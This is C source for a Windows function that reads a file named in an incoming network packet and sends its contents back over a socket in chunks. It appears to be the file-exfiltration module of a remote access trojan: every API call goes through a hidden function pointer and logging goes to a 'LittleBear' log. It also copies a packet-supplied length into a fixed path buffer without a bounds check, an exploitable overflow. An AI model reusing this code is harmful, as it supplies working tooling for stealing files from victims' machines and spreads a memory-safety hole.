
#include <windows.h>
#include <WinSock.h>
#include "../PublicVar.h"
#include "NetWorkData.h"



int UploadFile(SOCKET s,char * lpdata,int datalen,int bufsize){
	NETWORKFILEHDR stfh = *(LPNETWORKFILEHDR)lpdata;
	char szfn[MAX_PATH] = {0};
	char * lpfilename = lpdata + sizeof(NETWORKFILEHDR);
	memmove(szfn,lpfilename,stfh.len);
	int iRet = 0;

	char szlog[1024];

	HANDLE hFile = lpCreateFileA(szfn,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,0,
		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL|FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,0);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		wsprintfA(szlog,"uploadfile:%s not found\r\n",szfn);
		WriteLittleBearLog(szlog);
		iRet = SendCmdPacket(&stfh.packhdr.unique,s,FILE_TRANSFER_NOT_FOUND);
		if (iRet <= 0)
		{
			wsprintfA(szlog,"uploadfile:%s send FILE_TRANSFER_NOT_FOUND error\r\n",szfn);
			WriteLittleBearLog(szlog);
			return NETWORK_ERROR_CODE;
		}
		return iRet;
	}

	DWORD dwCnt = 0;

	DWORD filesizehigh = 0;
	int filesize = lpGetFileSize(hFile,&filesizehigh);
	if ( (filesizehigh <= 0) && (filesize <= 0 ) )
	{
		wsprintfA(szlog,"uploadfile:%s file size 0\r\n",szfn);
		WriteLittleBearLog(szlog);
		lpCloseHandle(hFile);
		iRet = SendCmdPacket(&stfh.packhdr.unique,s,FILE_TRANSFER_ZERO);
		if (iRet <= 0)
		{
			wsprintfA(szlog,"uploadfile:%s send FILE_TRANSFER_ZERO error\r\n",szfn);
			WriteLittleBearLog(szlog);
			return NETWORK_ERROR_CODE;
		}
		return iRet;
	}else if (filesizehigh || filesize >= MAX_BUF_SIZE)
	{
		wsprintfA(szlog,"uploadfile:%s file size:%u too big\r\n",szfn,filesize);
		WriteLittleBearLog(szlog);
		lpCloseHandle(hFile);
		iRet = SendCmdPacket(&stfh.packhdr.unique,s,FILE_TRANSFER_TOO_BIG);
		if (iRet <= 0)
		{
			wsprintfA(szlog,"uploadfile:%s send FILE_TRANSFER_TOO_BIG error\r\n",szfn);
			WriteLittleBearLog(szlog);
			return NETWORK_ERROR_CODE;
		}
		return iRet;
	}else
	{
		iRet = SendDataHeaderPacket(&stfh.packhdr.unique,s,UPLOADFILE,filesize);
		if (iRet <= 0)
		{
			wsprintfA(szlog,"uploadfile:%s send file header error\r\n",szfn);
			WriteLittleBearLog(szlog);
			return NETWORK_ERROR_CODE;
		}
	}

	int sendtimes = filesize / bufsize;
	int sendmod = filesize % bufsize;

	DWORD readcnt = 0;
	int sendtotal = 0;
	for (int i = 0; i < sendtimes; i ++)
	{
		iRet = lpReadFile(hFile,lpdata,bufsize,&readcnt,0);
		int sendcnt = lpsend(s,lpdata,readcnt,0);
		if (sendcnt <= 0)
		{
			wsprintfA(szlog,"uploadfile:%s send block:%u error\r\n",szfn,i*bufsize);
			WriteLittleBearLog(szlog);
			return NETWORK_ERROR_CODE;
		}
		sendtotal += sendcnt;
	}

	if (sendmod)
	{
		iRet = lpReadFile(hFile,lpdata,sendmod,&readcnt,0);
		int sendcnt = lpsend(s,lpdata,readcnt,0);
		if (sendcnt <= 0)
		{
			wsprintfA(szlog,"uploadfile:%s send block:%u error\r\n",szfn,sendtimes*bufsize + sendmod);
			WriteLittleBearLog(szlog);
			return NETWORK_ERROR_CODE;
		}
		sendtotal += sendcnt;
	}

	lpCloseHandle(hFile);

	wsprintfA(szlog,"uploadfile:%s send size:%u ok\r\n",szfn,sendtotal);
	WriteLittleBearLog(szlog);
	return TRUE;
}